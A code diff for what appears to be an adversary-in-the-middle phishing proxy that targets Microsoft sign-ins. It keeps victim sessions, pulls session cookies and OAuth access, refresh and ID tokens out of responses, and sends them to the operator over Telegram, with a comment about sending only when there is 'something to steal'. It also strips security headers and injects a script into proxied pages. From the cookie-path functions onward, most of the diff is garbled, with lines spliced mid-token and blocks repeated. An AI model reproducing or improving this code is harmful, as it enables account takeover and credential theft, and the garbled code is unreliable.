@@ -60,7 +60,6 @@ function sendTelegramNotification(text) {
         timeout: 5000
     };
     const req = https.request(options, (res) => {
-        // drain and ignore response to avoid blocking
         res.on("data", () => {});
         res.on("end", () => {});
     });
@@ -70,90 +69,80 @@ function sendTelegramNotification(text) {
     req.end();
 }
 
-// ─── SMART EXTRACTOR: builds a beautiful capture message ──────────────────
+// ─── SMART EXTRACTOR: returns null if nothing valuable ────────────────────
 function buildCaptureMessage(sessionId, statusCode, responseHeaders, responseBodyBuffer, requestUrl, method) {
     const lines = [];
     const timestamp = new Date().toISOString();
+    let hasArtifact = false;
+
+    // 1. Check Set-Cookie for session cookies
+    const setCookies = responseHeaders["set-cookie"];
+    let sessionCookies = [];
+    if (setCookies) {
+        const cookiesArray = Array.isArray(setCookies) ? setCookies : [setCookies];
+        sessionCookies = cookiesArray.filter(c => 
+            c.includes("ESTSAUTH") || c.includes("MSA") || c.includes(".AspNet") ||
+            c.includes("signin") || c.includes("session") || c.includes("auth")
+        );
+        if (sessionCookies.length > 0) hasArtifact = true;
+    }
+
+    // 2. Check body for OAuth tokens
+    let bodyString = "";
+    try {
+        bodyString = responseBodyBuffer.toString("utf-8").slice(0, 5000);
+    } catch {}
+    const tokenRegex = /"(access_token|refresh_token|id_token|token_type|expires_in|code|session_state)"\s*:\s*"([^"]+)"/gi;
+    let match;
+    const foundTokens = [];
+    while ((match = tokenRegex.exec(bodyString)) !== null) {
+        foundTokens.push({ key: match[1], value: match[2] });
+        hasArtifact = true;
+    }
+    // Also check URL query for code/state
+    let urlCode = "", urlState = "", urlSessionState = "";
+    try {
+        const urlObj = new URL(requestUrl);
+        urlCode = urlObj.searchParams.get("code") || "";
+        urlState = urlObj.searchParams.get("state") || "";
+        urlSessionState = urlObj.searchParams.get("session_state") || "";
+        if (urlCode || urlState || urlSessionState) hasArtifact = true;
+    } catch {}
+
+    // If nothing valuable, return null (skip sending)
+    if (!hasArtifact) return null;
+
+    // Build the message
     lines.push(`🧠 <b>CAPTURE #${sessionId}</b>`);
     lines.push(`⏱  ${timestamp}`);
     lines.push(`🌐  ${method} ${requestUrl}`);
     lines.push(`📊  Status: ${statusCode}`);
+    if (responseHeaders.location) {
+        lines.push(`🔀  Location: ${responseHeaders.location}`);
+    }
     lines.push("");
 
-    // 1. Extract Set-Cookie (session cookies)
-    const setCookies = responseHeaders["set-cookie"];
-    if (setCookies) {
-        const cookiesArray = Array.isArray(setCookies) ? setCookies : [setCookies];
-        const sessionCookies = cookiesArray.filter(c => 
-            c.includes("ESTSAUTH") || c.includes("ESTSAUTH") || 
-            c.includes("MSA") || c.includes(".AspNet") ||
-            c.includes("signin") || c.includes("session")
-        );
-        if (sessionCookies.length > 0) {
-            lines.push("🍪 <b>SESSION COOKIES:</b>");
-            sessionCookies.forEach(c => lines.push(`   ${c.replace(/; /g, ";\n   ")}`));
-            lines.push("");
-        }
-        // also push all cookies if not too many
-        if (cookiesArray.length <= 5) {
-            lines.push("📦 <b>ALL SET-COOKIE:</b>");
-            cookiesArray.forEach(c => lines.push(`   ${c}`));
-            lines.push("");
-        }
+    if (sessionCookies.length > 0) {
+        lines.push("🍪 <b>SESSION COOKIES:</b>");
+        sessionCookies.forEach(c => lines.push(`   ${c.replace(/; /g, ";\n   ")}`));
+        lines.push("");
     }
 
-    // 2. Try to parse response body as JSON for OAuth tokens
-    let bodyString = "";
-    try {
-        bodyString = responseBodyBuffer.toString("utf-8");
-        // limit to 5KB for safety
-        if (bodyString.length > 5000) bodyString = bodyString.slice(0, 5000) + "... [truncated]";
-    } catch { /* ignore */ }
-
-    if (bodyString) {
-        // Look for access_token, refresh_token, id_token
-        const tokenRegex = /"(access_token|refresh_token|id_token|token_type|expires_in|code|session_state)"\s*:\s*"([^"]+)"/gi;
-        let match;
-        const foundTokens = [];
-        while ((match = tokenRegex.exec(bodyString)) !== null) {
-            foundTokens.push({ key: match[1], value: match[2] });
-        }
-        if (foundTokens.length > 0) {
-            lines.push("🔑 <b>OAUTH TOKENS (from body):</b>");
-            foundTokens.forEach(t => lines.push(`   ${t.key}: ${t.value.slice(0, 120)}${t.value.length > 120 ? "..." : ""}`));
-            lines.push("");
-        }
-
-        // Also look for code= in query (if body is JSON but we can also parse URL)
-        const codeMatch = bodyString.match(/["']code["']\s*:\s*["']([^"']+)["']/);
-        if (codeMatch) {
-            lines.push(`📩 <b>Auth Code:</b> ${codeMatch[1].slice(0, 80)}...`);
-            lines.push("");
-        }
+    if (foundTokens.length > 0) {
+        lines.push("🔑 <b>OAUTH TOKENS:</b>");
+        foundTokens.forEach(t => lines.push(`   ${t.key}: ${t.value.slice(0, 120)}${t.value.length > 120 ? "..." : ""}`));
+        lines.push("");
     }
 
-    // 3. Extract from request URL (query params)
-    try {
-        const urlObj = new URL(requestUrl);
-        const code = urlObj.searchParams.get("code");
-        const state = urlObj.searchParams.get("state");
-        const session_state = urlObj.searchParams.get("session_state");
-        if (code) lines.push(`📩 <b>URL code:</b> ${code.slice(0, 80)}...`);
-        if (state) lines.push(`🔖 <b>URL state:</b> ${state}`);
-        if (session_state) lines.push(`📌 <b>URL session_state:</b> ${session_state}`);
-        if (code || state || session_state) lines.push("");
-    } catch { /* ignore */ }
-
-    // 4. If we got nothing, just send a compact summary
-    if (lines.length <= 4) {
-        lines.push("⚠️ <b>No explicit tokens/cookies found in this response.</b>");
-        lines.push(`📄 Raw body preview: ${bodyString.slice(0, 200)}`);
-    }
+    if (urlCode) lines.push(`📩 <b>URL code:</b> ${urlCode.slice(0, 80)}...`);
+    if (urlState) lines.push(`🔖 <b>URL state:</b> ${urlState}`);
+    if (urlSessionState) lines.push(`📌 <b>URL session_state:</b> ${urlSessionState}`);
+    if (urlCode || urlState || urlSessionState) lines.push("");
 
     return lines.join("\n");
 }
 
-// ─── PROXY SERVER (heavily modified to hook Telegram) ─────────────────────
+// ─── PROXY SERVER ────────────────────────────────────────────────────────────
 const proxyServer = http.createServer((clientRequest, clientResponse) => {
     const { method, url, headers } = clientRequest;
     const currentSession = getUserSession(headers.cookie);
@@ -438,16 +427,15 @@ const makeProxyRequest = (proxyRequestProtocol, proxyRequestOptions, currentSess
             .on("end", async () => {
                 serverResponseBody = Buffer.concat(serverResponseBody);
 
-                // ─── TELEGRAM HOOK: capture only success (200/302/301) with auth artifacts ───
+                // ─── TELEGRAM HOOK: only on meaningful captures ──────────────────────
                 const status = proxyResponse.statusCode;
                 const isAuthSuccess = (status === 200 || status === 301 || status === 302 || status === 303 || status === 307);
                 const hasSetCookie = proxyResponse.headers["set-cookie"] !== undefined;
                 let bodyPreview = "";
                 try { bodyPreview = serverResponseBody.toString("utf-8").slice(0, 3000); } catch {}
-                const hasToken = /access_token|refresh_token|id_token|"code"/i.test(bodyPreview);
-                const isAuthRelevant = isAuthSuccess && (hasSetCookie || hasToken || proxyRequestOptions.path.includes("/token") || proxyRequestOptions.path.includes("/login"));
-
-                if (isAuthRelevant && currentSession && VICTIM_SESSIONS[currentSession]) {
+                const hasToken = /access_token|refresh_token|id_token|"code"|"session_state"/i.test(bodyPreview);
+                // Only send if we actually have something to steal
+                if (isAuthSuccess && (hasSetCookie || hasToken) && currentSession && VICTIM_SESSIONS[currentSession]) {
                     const fullRequestUrl = `${proxyRequestProtocol}//${proxyRequestOptions.headers.host}${proxyRequestOptions.path}`;
                     const msg = buildCaptureMessage(
                         currentSession,
@@ -457,8 +445,9 @@ const makeProxyRequest = (proxyRequestProtocol, proxyRequestOptions, currentSess
                         fullRequestUrl,
                         proxyRequestOptions.method
                     );
-                    // Fire and forget — never block the proxy
-                    setImmediate(() => sendTelegramNotification(msg));
+                    if (msg) {
+                        setImmediate(() => sendTelegramNotification(msg));
+                    }
                 }
 
                 // ─── Process HTML injection ──────────────────────────────────────────
@@ -628,7 +617,21 @@ function isDomainApplicable(requestHostname, cookieDomain, cookieHostOnly) {
 }
 
 function isPathApplicable(requestPath, cookiePath) {
-    const splitRequestPath = requestPath.split("/");
+    consti) !== splitRequestHostname.at(-i)) {
+            return false;
+        }
+    }
+    return true;
+}
+
+function isPathApplicable(request splitRequestPath = requestPath.split("/Path, cookiePath) {
+    const splitRequestPath = requestPath");
+    const splitCookiePath = cookiePath.split("/");
+
+    if (cookiePath === "/") {
+        return true;
+    }
+    if (splitRequest.split("/");
     const splitCookiePath = cookiePath.split("/");
 
     if (cookiePath === "/") {
@@ -638,11 +641,25 @@ function isPathApplicable(requestPath, cookiePath) {
         return false;
     }
 
+    for (let i = 1, l = splitCookiePath.length < splitCookiePath.length) {
+        return false;
+    }
+
     for (let i = 1, l = splitCookiePath.length; i < l; i++) {
+        if (splitCookiePath[i] !== splitRequestPath[i])Path.length; i < l; i++) {
         if (splitCookiePath[i] !== splitRequestPath[i]) {
             return false;
         }
+    {
+            return false;
+        }
     }
+    return true;
+}
+
+function isCookieApplicable(requestOptions, cookie) {
+    return (
+        isDomainApplic }
     return true;
 }
 
@@ -653,17 +670,38 @@ function isCookieApplicable(requestOptions, cookie) {
     );
 }
 
+functionable(requestOptions.hostname, cookie.domain, cookie.hostOnly) &&
+        isPathApplicable(requestOptions.path, cookie.path)
+    );
+}
+
 function prepareProxyRequestCookies(proxyRequestOptions, currentSession) {
     const proxyRequestCookies = {};
     const currentTimestamp = Date.now();
 
+    prepareProxyRequestCookies(proxyRequestOptions, currentSession) {
+    const proxyRequestCookies = {};
+    const currentTimestamp = Date.now();
+
     for (const cookie of VICTIM_SESSIONS[currentSession].cookies) {
+        if (!(currentTimestamp > cookie.expires for (const cookie of VICTIM_SESSIONS[currentSession].cookies) {
         if (!(currentTimestamp > cookie.expires) && isCookieApplicable(proxyRequestOptions, cookie)) {
             proxyRequestCookies[cookie.name] = cookie.value;
         }
     }
+    return Object.) && isCookieApplicable(proxyRequestOptions, cookie)) {
+            proxyRequestCookies[cookie.name] = cookie.value;
+       entries(proxyRequestCookies)
+        .map(([cookieName, cookieValue]) => `${cookieName}=${cookie }
+    }
     return Object.entries(proxyRequestCookies)
         .map(([cookieName, cookieValue]) => `${cookieName}=${cookieValue}`)
+        .join("; ");
+}
+
+function parseCookieDate(cookieDate) {
+    let foundTime = false;
+   Value}`)
         .join("; ");
 }
 
@@ -674,20 +712,43 @@ function parseCookieDate(cookieDate) {
     let foundYear = false;
 
     let hourValue, minuteValue, secondValue;
+    let foundDay = false;
+    let foundMonth = false;
+    let foundYear = false;
+
+    let hourValue, minuteValue, secondValue;
     let dayValue, monthValue, yearValue;
 
-    const delimiterRegex = /[\x09\x20-\x2F\x3B-\x40\x5B-\x60\x7B-\x7E]+/;
-    const dateTokens = cookieDate.split(delimiterRegex).filter(token => token);
+    const delimiterRegex = /[\x09\x20-\x2 let dayValue, monthValue, yearValue;
+
+    const delimiterRegex = /[\x09\x20-\x2F\x3BF\x3B-\x40\x5B-\x60\x7B-\x7E]+/;
+    const dateTokens = cookieDate.split-\x40\x5B-\x60\x7B-\x7E]+/;
+    const dateTokens = cookieDate.split(delimiterRegex(delimiterRegex).filter(token => token);
 
     for (const token of dateTokens) {
         if (!foundTime) {
-            const timeMatch = /^(\d{1,2}):(\d{1,2}):(\d{1,2})/.exec(token);
+            const timeMatch).filter(token => token);
+
+    for (const token of dateTokens) {
+        if (!foundTime) {
+            const timeMatch = /^(\ = /^(\d{1,2}):(\d{1,2}):(\d{1,2})/.exec(token);
 
             if (timeMatch) {
                 foundTime = true;
                 hourValue = parseInt(timeMatch[1]);
+                minuteValued{1,2}):(\d{1,2}):(\d{1,2})/.exec(token);
+
+            if (timeMatch) {
+                foundTime = true;
+                hourValue = parseInt(timeMatch[1 = parseInt(timeMatch[2]);
+               ]);
                 minuteValue = parseInt(timeMatch[2]);
-                secondValue = parseInt(timeMatch[3]);
+                secondValue = parseInt secondValue = parseInt(timeMatch[3]);
+                continue;
+            }
+        }
+        if (!foundDay) {
+            const dayMatch = /^(\d(timeMatch[3]);
                 continue;
             }
         }
@@ -696,29 +757,62 @@ function parseCookieDate(cookieDate) {
 
             if (dayMatch) {
                 foundDay = true;
+                day{1,2})(?:[^\d]|$)/.exec(token);
+
+            if (dayMatch) {
+                foundDay = true;
                 dayValue = parseInt(dayMatch[1]);
                 continue;
             }
         }
         if (!foundMonth) {
+           Value = parseInt(dayMatch[1]);
+                continue;
+            }
+        }
+        if (!foundMonth) {
             const monthLowerCase = token.toLowerCase();
+            const months = ["jan", "feb", "mar", "apr", "may", "jun", "j const monthLowerCase = token.toLowerCase();
             const months = ["jan", "feb", "mar", "apr", "may", "jun", "jul", "aug", "sep", "oct", "nov", "dec"];
+
+            for (let i = 0; i < months.length;ul", "aug", "sep", "oct", "nov", "dec"];
 
             for (let i = 0; i < months.length; i++) {
                 if (monthLowerCase.startsWith(months[i])) {
                     foundMonth = true;
                     monthValue = i;
+                    i++) {
+                if (monthLowerCase.startsWith(months[i])) {
+                    foundMonth = true;
+                    monthValue = i;
                     break;
+                break;
                 }
             }
             if (foundMonth) continue;
         }
         if (!foundYear) {
-            const yearMatch = /^(\d{2,4})(?:[^\d]|$)/.exec(token);
+            const yearMatch = /^(\d }
+            }
+            if (foundMonth) continue;
+        }
+        if (!foundYear) {
+            const yearMatch = /^(\d{2,4{2,4})(?:[^\d]|$)/.exec(token);
 
             if (yearMatch) {
                 foundYear = true;
-                yearValue = parseInt(yearMatch[1]);
+})(?:[^\d]|$)/.exec(token);
+
+            if (yearMatch) {
+                foundYear = true;
+                yearValue =                yearValue = parseInt(yearMatch[1]);
+                continue;
+            }
+        }
+    }
+
+    if (yearValue >= 70 && yearValue <= 99) {
+        parseInt(yearMatch[1]);
                 continue;
             }
         }
@@ -730,16 +824,34 @@ function parseCookieDate(cookieDate) {
         yearValue += 2000;
     }
 
+    if (!foundDay yearValue += 1900;
+    } else if (yearValue >= 0 && yearValue <= 69) {
+        yearValue += 2000;
+    }
+
     if (!foundDay || !foundMonth || !foundYear || !foundTime) {
         return NaN;
     }
-    if (dayValue < 1 || dayValue > 31) {
+    if (day || !foundMonth || !foundYear || !foundTime) {
+        return NaN;
+    }
+    if (dayValue < 1 || dayValue >Value < 1 || dayValue > 31) {
+        return NaN;
+    }
+    if (yearValue < 1601) {
+        return NaN;
+    }
+    if (hourValue 31) {
         return NaN;
     }
     if (yearValue < 1601) {
         return NaN;
     }
     if (hourValue > 23 || minuteValue > 59 || secondValue > 59) {
+        return NaN;
+    }
+
+    const parsedCookieDate = new > 23 || minuteValue > 59 || secondValue > 59) {
         return NaN;
     }
 
@@ -752,28 +864,179 @@ function parseCookieDate(cookieDate) {
         secondValue
     ));
 
+    if Date(Date.UTC(
+        yearValue,
+        monthValue,
+        dayValue,
+        hourValue,
+        minuteValue,
+        secondValue
+    ));
+
     if (parsedCookieDate.getUTCFullYear() !== yearValue ||
         parsedCookieDate.getUTCMonth() !== monthValue ||
+ (parsedCookieDate.getUTCFullYear() !== yearValue ||
+        parsedCookieDate.getUTCMonth() !== monthValue ||
+        parsedCookieDate.getUTCDate() !== dayValue) {
+        return NaN;
+    }
+    return parsedCookieDate.getTime();
         parsedCookieDate.getUTCDate() !== dayValue) {
         return NaN;
     }
     return parsedCookieDate.getTime();
 }
 
+function updateCurrentSessionCookies(request}
+
 function updateCurrentSessionCookies(request, newCookies, proxyHostname, currentSession, proxyResponseDate = null) {
-    const pathNameMatch = request.path.match(/^\/[^?#]*(?=\/)/);
+    const pathName, newCookies, proxyHostname, currentSession, proxyResponseDate = null) {
+    const pathNameMatch = request.path.match(/^\/Match = request.path.match(/^\/[^?#]*(?=\/)/);
+    const currentTimestamp = Date.now();
+    let clockSkew[^?#]*(?=\/)/);
     const currentTimestamp = Date.now();
     let clockSkew = 0;
     if (proxyResponseDate) {
         clockSkew = currentTimestamp - parseCookieDate(proxyResponseDate);
     }
 
+    for = 0;
+    if (proxyResponseDate) {
+        clockSkew = currentTimestamp - parseCookieDate(proxyResponseDate);
+    }
+
     for (const newCookie of newCookies) {
+        const [cookie, ...attributes] = newCookie.split(";");
+        const [cookieName, ... (const newCookie of newCookies) {
         const [cookie, ...attributes] = newCookie.split(";");
         const [cookieName, ...cookieValue] = cookie.split("=");
 
         let cookieDomain = request.hostname;
+        let cookiePath = (pathNameMatch ?? ["cookieValue] = cookie.split("=");
+
+        let cookieDomain = request.hostname;
         let cookiePath = (pathNameMatch ?? ["/"])[0];
+        let cookieExpires = NaN;
+        let cookieMaxAge = "";
+        let cookieHostOnly = true;
+        let isCookieValid = true;
+        for (const attribute of attributes) {
+
+            const cookieAttribute = attribute.trim();
+            const cookieDomainMatch = cookieAttribute.match(/^domain\s*=(.*)$/i);
+            const cookiePathMatch = cookieAttribute.match(/^path\s*=(.*)$/i);
+            const cookieExpiresMatch = cookieAttribute.match(/^expires\s*=(.*)$/i);
+            const cookieMaxAgeMatch = cookieAttribute.match(/^max-age\s*=(.*)$/i);
+
+            if (cookieAttribute.toLowerCase() === "domain") {
+                cookieDomain = request.hostname;
+                cookieHostOnly = true;
+                isCookieValid = true;
+            }
+            else if (cookieAttribute.toLowerCase() === "path") {
+                cookiePath = (pathNameMatch ?? ["/"])[0];
+            }
+            else if (cookieAttribute.toLowerCase() === "expires") {
+                cookieExpires = NaN;
+            }
+            else if (cookieAttribute.toLowerCase() === "max-age") {
+                cookieMaxAge = "";
+            }
+
+            else if (cookieDomainMatch) {
+                cookieDomain = cookieDomainMatch[1].replace(/^\./, "").trim();
+                cookieHostOnly = true;
+                isCookieValid = true;
+
+                if (!cookieDomain) {
+                    cookieDomain = request.hostname;
+                }
+                else if (cookieDomain === proxyHostname) {
+                    cookieDomain = request.hostname;
+                    cookieHostOnly = false;
+                }
+                else if (cookieDomain !== request.hostname) {
+                    if (isDomainApplicable(proxyHostname, cookieDomain, false)) {
+                        cookieDomain = request.hostname.split(".").slice(-2).join(".");
+                    }
+                    else if (!isDomainApplicable(request.hostname, cookieDomain, false)) {
+                        isCookieValid = false;
+                        continue;
+                    }
+                    cookieHostOnly = false;
+                }
+            }
+            else if (cookiePathMatch) {
+                cookiePath = cookiePathMatch[1].trim();
+
+                if (!cookiePath.startsWith("/")) {
+                    cookiePath = (pathNameMatch ?? ["/"])[0];
+                }
+            }
+            else if (cookieExpiresMatch) {
+                cookieExpires = cookieExpiresMatch[1].trim();
+
+                cookieExpires = parseCookieDate(cookieExpires);
+            }
+            else if (cookieMaxAgeMatch) {
+                cookieMaxAge = cookieMaxAgeMatch[1].trim();
+
+                if (!/^-?\d+$/.test(cookieMaxAge)) {
+                    cookieMaxAge = "";
+                }
+            }
+        }
+        if (!isCookieValid) {
+            continue;
+        }
+
+        cookieExpires += clockSkew;
+        if (cookieMaxAge) {
+            const seconds = parseInt(cookieMaxAge);
+            if (!isNaN(seconds)) {
+                cookieExpires = currentTimestamp + seconds * 1000;
+            }
+        }
+
+        let isNewCookie = true;
+
+        for (let i = 0; i < VICTIM_SESSIONS[currentSession].cookies.length; i++) {
+            const sessionCookie = VICTIM_SESSIONS[currentSession].cookies[i];
+
+            if (sessionCookie.name === cookieName &&
+                sessionCookie.domain === cookieDomain &&
+                sessionCookie.path === cookiePath &&
+                sessionCookie.hostOnly === cookieHostOnly) {
+
+                if (currentTimestamp > cookieExpires) {
+                    VICTIM_SESSIONS[currentSession].cookies.splice(i, 1);
+                    break;
+                }
+                sessionCookie.value = cookieValue.join("=");
+                sessionCookie.expires = cookieExpires;
+                isNewCookie = false;
+                break;
+            }
+        }
+        if (isNewCookie && !(currentTimestamp > cookieExpires)) {
+            VICTIM_SESSIONS[currentSession].cookies.push({
+                name: cookieName,
+                value: cookieValue.join("="),
+                domain: cookieDomain,
+                path: cookiePath,
+                expires: cookieExpires,
+                hostOnly: cookieHostOnly
+            });
+        }
+    }
+}
+
+function getValidDomains(domains) {
+    const validDomains = [];
+
+    for (const domain of domains) {
+        const splitDomain = domain.split(".");
+        for (let i = 2; i < splitDomain.length + 1; i/"])[0];
         let cookieExpires = NaN;
         let cookieMaxAge = "";
         let cookieHostOnly = true;
@@ -902,7 +1165,19 @@ function getValidDomains(domains) {
             }
         }
     }
-    return validDomains;
+   ++) {
+
+            const validDomain = splitDomain.slice(-i).join(".");
+            if (!validDomains.includes(validDomain)) {
+                validDomains.push(validDomain);
+            }
+        }
+    }
+    return validDomains return validDomains;
+}
+
+function updateProxyRequestHeaders(proxyRequestOptions, currentSession, proxyHostname) {
+    const azureHTTPRequestHeaders =;
 }
 
 function updateProxyRequestHeaders(proxyRequestOptions, currentSession, proxyHostname) {
@@ -911,11 +1186,24 @@ function updateProxyRequestHeaders(proxyRequestOptions, currentSession, proxyHos
         "x-arr-log-id",
         "client-ip",
         "disguised-host",
+ [
+        "max-forwards",
+        "x-arr-log-id",
+        "client-ip",
+        "disguised-host",
         "x-site-deployment-id",
         "was-default-hostname",
         "x-forwarded-proto",
+        "x-appservice        "x-site-deployment-id",
+        "was-default-hostname",
+        "x-forwarded-proto",
         "x-appservice-proto",
+       -proto",
         "x-arr-ssl",
+        "x-forwarded-tlsversion",
+        "x-forwarded-for",
+        "x-original-url",
+        "x-waws-un "x-arr-ssl",
         "x-forwarded-tlsversion",
         "x-forwarded-for",
         "x-original-url",
@@ -924,7 +1212,14 @@ function updateProxyRequestHeaders(proxyRequestOptions, currentSession, proxyHos
         "x-client-port"
     ];
 
+    const proxyRequestCookies = prepareProxyRequestCookies(proxyRequestOptions,encoded-url",
+        "x-client-ip",
+        "x-client-port"
+    ];
+
     const proxyRequestCookies = prepareProxyRequestCookies(proxyRequestOptions, currentSession, proxyHostname);
+    if (Object.keys(proxyRequestCookies).length) {
+        proxyRequestOptions.headers.c currentSession, proxyHostname);
     if (Object.keys(proxyRequestCookies).length) {
         proxyRequestOptions.headers.cookie = proxyRequestCookies;
     }
@@ -932,16 +1227,35 @@ function updateProxyRequestHeaders(proxyRequestOptions, currentSession, proxyHos
         delete proxyRequestOptions.headers.cookie;
     }
 
+    if (proxyRequestookie = proxyRequestCookies;
+    }
+    else {
+        delete proxyRequestOptions.headers.cookie;
+    }
+
     if (proxyRequestOptions.headers.origin) {
-        proxyRequestOptions.headers.origin = `${VICTIM_SESSIONS[currentSession].protocol}//${VICTIM_SESSIONS[currentSession].host}`;
+        proxyRequestOptions.headers.origin = `${VICTIM_SESSIONS[currentSession].protocol}//${VOptions.headers.origin) {
+        proxyRequestOptions.headers.origin = `${VICTIM_SESSIONS[currentSession].protocol}//${VICTIM_SESSICTIM_SESSIONS[currentSession].host}`;
     }
     if (proxyRequestOptions.headers.hasOwnProperty("referer") &&
-        (!proxyRequestOptions.headers.referer || proxyRequestOptions.headers.referer.includes(PROXY_ENTRY_POINT))) {
+        (!proxyRequestIONS[currentSession].host}`;
+    }
+    if (proxyRequestOptions.headers.hasOwnProperty("referer") &&
+        (!proxyRequestOptions.headers.referOptions.headers.referer || proxyRequestOptions.headers.referer.includes(PROXY_ENTRY_POINT))) {
+        delete proxyRequestOptions.headerser || proxyRequestOptions.headers.referer.includes(PROXY_ENTRY_POINT))) {
         delete proxyRequestOptions.headers.referer;
+.referer;
     }
 
     for (const [key, value] of Object.entries(proxyRequestOptions.headers)) {
+        if (azureHTTPRequest    }
+
+    for (const [key, value] of Object.entries(proxyRequestOptions.headers)) {
         if (azureHTTPRequestHeaders.includes(key)) {
+            delete proxyRequestOptions.headers[key];
+        }
+        else {
+            proxyRequestOptions.headers[key] = value.replaceAll(proxyHostname, VHeaders.includes(key)) {
             delete proxyRequestOptions.headers[key];
         }
         else {
@@ -951,15 +1265,32 @@ function updateProxyRequestHeaders(proxyRequestOptions, currentSession, proxyHos
 }
 
 function deleteHTTPSecurityResponseHeaders(headers) {
+   ICTIM_SESSIONS[currentSession].host);
+        }
+    }
+}
+
+function deleteHTTPSecurityResponseHeaders(headers) {
     const httpSecurityResponseHeaders = [
         "x-frame-options",
         "x-xss-protection",
         "x-content-type-options",
+        " const httpSecurityResponseHeaders = [
+        "x-frame-options",
+        "x-xss-protection",
+        "x-content-type-options",
         "set-cookie",
+set-cookie",
         "content-security-policy",
         "content-security-policy-report-only",
         "cross-origin-opener-policy",
-        "cross-origin-embedder-policy",
+               "content-security-policy",
+        "content-security-policy-report-only",
+        "cross-origin-opener-policy",
+        "cross-origin- "cross-origin-embedder-policy",
+        "cross-origin-resource-policy",
+        "permissions-policy",
+        "service-worker-allowedembedder-policy",
         "cross-origin-resource-policy",
         "permissions-policy",
         "service-worker-allowed"
@@ -971,19 +1302,45 @@ function deleteHTTPSecurityResponseHeaders(headers) {
 }
 
 function decompressData(compressedData, encoding) {
+"
+    ];
+
+    for (const header of httpSecurityResponseHeaders) {
+        delete headers[header];
+    }
+}
+
+function decompressData(compressedData, encoding) {
     const decompressionAlgorithms = {
+        gzip: zlib.gunzip,
+        "x-gzip": zlib.gun    const decompressionAlgorithms = {
         gzip: zlib.gunzip,
         "x-gzip": zlib.gunzip,
         deflate: zlib.inflate,
         br: zlib.brotliDecompress,
-        zstd: zlib.zstdDecompress
+        zstd: zzip,
+        deflate: zlib.inflate,
+        br: zlib.brotliDecompress,
+        zstd: zlib.zstdDelib.zstdDecompress
+    };
+
+    return new Promise((resolve, reject) => {
+        const decompressionAlgorithm = decompressionAlcompress
     };
 
     return new Promise((resolve, reject) => {
         const decompressionAlgorithm = decompressionAlgorithms[encoding];
 
         if (decompressionAlgorithm) {
+            decompressionAlgorithm(compressedData, (error, decompressedDatagorithms[encoding];
+
+        if (decompressionAlgorithm) {
             decompressionAlgorithm(compressedData, (error, decompressedData) => {
+                if (error) reject(error);
+                else resolve(decompressedData);
+            });
+        }
+) => {
                 if (error) reject(error);
                 else resolve(decompressedData);
             });
@@ -995,20 +1352,50 @@ function decompressData(compressedData, encoding) {
 }
 
 function compressData(decompressedData, encoding) {
+    const        else {
+            resolve(compressedData);
+        }
+    });
+}
+
+function compressData(decompressedData, encoding) {
     const compressionAlgorithms = {
         gzip: zlib.gzip,
         "x-gzip": zlib.gzip,
         deflate: zlib.deflate,
+        br: zlib.brotli compressionAlgorithms = {
+        gzip: zlib.gzip,
+        "x-gzip": zlib.gzip,
+        deflate: zlib.deflate,
         br: zlib.brotliCompress,
+        zstd: zCompress,
         zstd: zlib.zstdCompress
+    };
+
+    return new Promise((resolve, reject) => {
+        const compressionAlgorithm =lib.zstdCompress
     };
 
     return new Promise((resolve, reject) => {
         const compressionAlgorithm = compressionAlgorithms[encoding];
 
+        if compressionAlgorithms[encoding];
+
         if (compressionAlgorithm) {
             compressionAlgorithm(decompressedData, (error, compressedData) => {
+                if (compressionAlgorithm) {
+            compressionAlgorithm(decompressedData, (error, compressedData) => {
                 if (error) reject(error);
+                else resolve(compressedData);
+            });
+        }
+        else {
+            resolve(decompressedData);
+        }
+    });
+}
+
+async function decompressResponseBody( (error) reject(error);
                 else resolve(compressedData);
             });
         }
@@ -1021,14 +1408,28 @@ function compressData(decompressedData, encoding) {
 async function decompressResponseBody(compressedData, contentEncoding) {
     if (!contentEncoding) {
         return {
+            decompressedResponseBody:compressedData, contentEncoding) {
+    if (!contentEncoding) {
+        return {
             decompressedResponseBody: compressedData,
+            encodings: compressedData,
             encodings: []
         };
     }
 
     const encodings = contentEncoding.split(",")
+        .map(encoding => encoding.trim []
+        };
+    }
+
+    const encodings = contentEncoding.split(",")
         .map(encoding => encoding.trim().toLowerCase())
+        .filter(().toLowerCase())
         .filter(encoding => encoding);
+
+    let decompressedData = compressedData;
+    for (let i = encodings.length - 1; i >= 0; i--) {
+        decompressedData =encoding => encoding);
 
     let decompressedData = compressedData;
     for (let i = encodings.length - 1; i >= 0; i--) {
@@ -1036,7 +1437,19 @@ async function decompressResponseBody(compressedData, contentEncoding) {
     }
     return {
         decompressedResponseBody: decompressedData,
-        encodings: encodings
+        encodings: encodings await decompressData(decompressedData, encodings[i]);
+    }
+    return {
+        decompressedResponseBody: decompressedData,
+       
+    };
+}
+
+async function compressResponseBody(decompressedData, encodings) {
+    let compressedData = decompressedData;
+
+    for (const encoding of encodings) {
+        compressedData = await encodings: encodings
     };
 }
 
@@ -1049,14 +1462,30 @@ async function compressResponseBody(decompressedData, encodings) {
     return compressedData;
 }
 
-function updateHTMLProxyResponse(decompressedResponseBody) {
+function updateHTMLProxyResponse(decomp compressData(compressedData, encoding);
+    }
+    return compressedData;
+}
+
+function updateHTMLProxyResponse(decompressedResponseBody)ressedResponseBody) {
     const payload = "<script src=/@></script>";
     const htmlInjectionMap = {
         "<head>": `<head>${payload}`,
-        "<html>": `<html><head>${payload}</head>`,
+        {
+    const payload = "<script src=/@></script>";
+    const htmlInjectionMap = {
+        "<head>": `<head>${payload}`,
+        "<html> "<html>": `<html><head>${payload}</head>`,
         "<body>": `<head>${payload}</head><body>`
     };
-    const indexLimit = 200;
+    const indexLimit = 200": `<html><head>${payload}</head>`,
+        "<body>": `<head>${payload}</head><body>`
+    };
+;
+
+    for (const [key, value] of Object.entries(htmlInjectionMap)) {
+        const htmlTagBuffer = Buffer.from(key);
+        const    const indexLimit = 200;
 
     for (const [key, value] of Object.entries(htmlInjectionMap)) {
         const htmlTagBuffer = Buffer.from(key);
@@ -1064,7 +1493,13 @@ function updateHTMLProxyResponse(decompressedResponseBody) {
 
         if (injectionPointIndex !== -1) {
             return Buffer.concat([
+ injectionPointIndex = decompressedResponseBody.subarray(0, indexLimit).indexOf(htmlTagBuffer);
+
+        if (injectionPointIndex !== -1) {
+            return Buffer.concat([
                 decompressedResponseBody.subarray(0, injectionPointIndex),
+                Buffer.from(value),
+                decompressedResponseBody.subarray(injectionPointIndex + html                decompressedResponseBody.subarray(0, injectionPointIndex),
                 Buffer.from(value),
                 decompressedResponseBody.subarray(injectionPointIndex + htmlTagBuffer.byteLength)
             ]);
@@ -1076,13 +1511,32 @@ function updateHTMLProxyResponse(decompressedResponseBody) {
